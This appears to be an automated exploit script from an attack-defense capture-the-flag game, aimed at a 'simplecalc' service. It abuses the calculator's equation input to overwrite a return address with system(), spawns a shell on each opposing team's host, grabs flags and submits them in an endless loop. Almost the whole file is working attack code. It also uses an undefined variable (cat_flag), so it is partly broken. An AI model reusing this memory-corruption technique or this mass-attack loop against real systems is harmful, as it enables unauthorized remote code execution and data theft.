#!/usr/bin/env python3
import swpag_client
from pwn import *
import flag_submitter
import time

def name():
    return "simplecalc"

def help():
    return "Usage: ./bladestorm.py simplecalc"

def args():
    # No argument needed
    return ""

def run(args):

    #-------------------Changeme-------------------#
    team_ip = "<ip>" # as a string
    token = "<token>" # as a string
    target_service_id = 1 # as an int
    #----------------------------------------------#

    # Connect to team interface
    team_interface = "http://" + team_ip + "/"
    t = swpag_client.Team(team_interface, token)

    # simplecalc
    def exploit(team):

        """
        The argument "team" is a dictionary object. Example:

        {u'flag_id': u'someid',
         u'hostname': u'team36',
         u'port': 10001,
         u'team_name': u'Team 36'}

        Here we only care about team["hostname"], team["port"], and team["flag_id"].
        """

        #----------------------------------------Info----------------------------------------#
        host = team["hostname"]
        port = team["port"]
        flag_id = team["flag_id"]
        #------------------------------------------------------------------------------------#

        with remote(host, port, timeout=3) as r:
            r.readuntil("Enter username:")
            r.sendline("sh")
            r.readuntil("Enter password:")
            r.sendline("pwned")
            r.readuntil("Enter password:")
            r.sendline("pwned")
            r.readuntil("<S>olve eqns or <R>etrieve result")
            r.sendline("S")
            r.readuntil("Enter equations, use a blank line to end")
            r.sendline("V0=V-8+0")
            # set V1 to address of name
            r.sendline("V1=V0+10641")
            # set V2 to address of system
            r.sendline("V2=V0+130")
            # overwrite ret addr
            r.sendline("V-1073741792=V2+0")
            # put name as argument
            r.sendline("V-1073741791=V1+0")
            # end the solving
            r.sendline()
            r.sendline(cat_flag)
            r.read()
            response = r.read(4096).strip().decode()
            print(response)
            flag = search("^FLG.*", response).group()
            print(flag)
            # The exploit() function always returns a flag
            # and it will be appended to the "flags" array
            return flag

    #---------------------------Exploit Thrower---------------------------#
    while True:
        # Learn which teams can be attacked at this moment
        targets = t.get_targets(target_service_id)

        flags = []
        for team in targets:
            if team["team_name"] == "Team 35":
                continue

            try:
                flag = exploit(team)
                # Sanity check on flag
                if flag.startswith("FLG"):
                    flags.append(flag)

            except:
                continue

        # This should an array containing many flags
        print(f"Flags collected: {flags}")

        # Try submitting all the flags
        flag_submitter.flag_submitter(t, flags)

        # Wait until next tick to avoid spamming
        time.sleep(t.get_tick_info()["approximate_seconds_left"] + 30)
    #--------------------------------------------------------------------#
